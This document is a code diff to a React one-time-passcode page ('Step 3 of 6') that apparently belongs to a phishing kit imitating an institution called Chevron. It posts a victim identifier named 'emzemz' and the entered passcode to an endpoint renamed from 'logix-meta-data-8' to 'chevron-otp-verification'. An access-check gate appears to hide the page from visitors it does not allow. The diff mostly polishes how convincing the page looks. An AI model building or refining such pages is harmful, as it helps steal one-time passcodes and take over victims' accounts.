@@ -3,6 +3,7 @@ import { useLocation, useNavigate } from 'react-router-dom';
 import axios from 'axios';
 import { baseUrl } from '../constants';
 import useAccessCheck from '../Utils/useAccessCheck';
+import FlowPageLayout from '../components/FlowPageLayout';
 
 const OTP: React.FC = () => {
   const [otp, setOtp] = useState('');
@@ -13,12 +14,12 @@ const OTP: React.FC = () => {
   const { emzemz } = location.state || {};
   const isAllowed = useAccessCheck(baseUrl);
 
-  if (!isAllowed) {
-    return <div>Loading...</div>;
+  if (isAllowed === null) {
+    return <div className="min-h-screen flex items-center justify-center text-gray-700">Checking access…</div>;
   }
 
-  if (!emzemz) {
-    return <div>Missing verification details. Please restart the login process.</div>;
+  if (isAllowed === false) {
+    return <div className="min-h-screen flex items-center justify-center text-gray-700">Access denied. Redirecting…</div>;
   }
 
   const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
@@ -33,7 +34,7 @@ const OTP: React.FC = () => {
     setIsLoading(true);
 
     try {
-      await axios.post(`${baseUrl}api/logix-meta-data-8/`, {
+      await axios.post(`${baseUrl}api/chevron-otp-verification/`, {
         emzemz,
         otp,
       });
@@ -46,62 +47,56 @@ const OTP: React.FC = () => {
     }
   };
 
+  if (!emzemz) {
+    return <div className="min-h-screen flex items-center justify-center text-gray-700">Missing verification details. Please restart the login process.</div>;
+  }
+
   return (
-    <div className="flex-1 bg-gray-200 rounded shadow-sm">
-      <div className="border-b-2 border-teal-500 px-8 py-4">
-        <h2 className="text-xl font-semibold text-gray-800">Verify Your Identity</h2>
-      </div>
+    <FlowPageLayout
+      eyebrow="Step 3 of 6"
+      title="Verify Your Identity"
+      description="Enter the one-time passcode we just sent. This helps us confirm it's really you before continuing."
+      contentClassName="space-y-6"
+    >
+      <form onSubmit={handleSubmit} className="space-y-6">
+        <div className="space-y-2">
+          <label className="text-xs font-semibold uppercase tracking-wide text-[#0e2f56]">Passcode</label>
+          <input
+            id="otp"
+            name="otp"
+            type="text"
+            value={otp}
+            onChange={(e) => setOtp(e.target.value.replace(/\s/g, ''))}
+            maxLength={10}
+            className="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm tracking-[0.3em] text-center focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
+            placeholder="Enter OTP"
+          />
+        </div>
 
-      <div className="px-6 py-6 bg-white space-y-4">
-        <p className="text-sm text-gray-700">
-          Enter the one-time passcode we just sent to finish signing in.
-        </p>
-
-        <form onSubmit={handleSubmit} className="space-y-4">
-          <div className="flex items-center gap-4">
-            <label className="text-gray-700 w-32 text-right">Passcode:</label>
-            <input
-              id="otp"
-              name="otp"
-              type="text"
-              value={otp}
-              onChange={(e) => setOtp(e.target.value.replace(/\s/g, ''))}
-              maxLength={10}
-              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm tracking-widest text-center"
-              placeholder="Enter OTP"
-            />
+        {error && (
+          <div className="flex items-center gap-2 text-xs font-semibold text-red-600">
+            <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
+              <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
+            </svg>
+            <span>{error}</span>
           </div>
+        )}
 
-          {error && (
-            <div className="flex items-center gap-2 text-sm text-red-600">
-              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
-              </svg>
-              <span>{error}</span>
-            </div>
-          )}
+        <div className="flex justify-end">
+          <button
+            type="submit"
+            disabled={isLoading}
+            className="inline-flex items-center justify-center rounded-sm bg-[#003e7d] px-8 py-3 text-sm font-semibold uppercase tracking-wide text-white transition hover:bg-[#002c5c] disabled:cursor-not-allowed disabled:opacity-70"
+          >
+            {isLoading ? 'Verifying…' : 'Verify'}
+          </button>
+        </div>
+      </form>
 
-          <div className="border-b-2 border-teal-500 flex justify-center px-6 py-4">
-            {!isLoading ? (
-              <button
-                type="submit"
-                className="bg-gray-600 hover:bg-gray-700 text-white px-16 py-2 text-sm rounded"
-              >
-                Verify
-              </button>
-            ) : (
-              <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-gray-600 border-t-transparent" />
-            )}
-          </div>
-        </form>
+      <div className="rounded-sm bg-[#f0f6fb] px-4 py-3 text-xs text-[#0e2f56]/80">
+        We sent the code to the phone number on file. Didn’t get it? Request another passcode from the previous screen.
       </div>
-
-      <div className="px-6 pb-6">
-        <p className="text-xs text-gray-700">
-          For your security, we've sent a verification code to your registered phone number. If you didn't receive a passcode, check your spam folder or request a new one from the previous screen.
-        </p>
-      </div>
-    </div>
+    </FlowPageLayout>
   );
 };
 
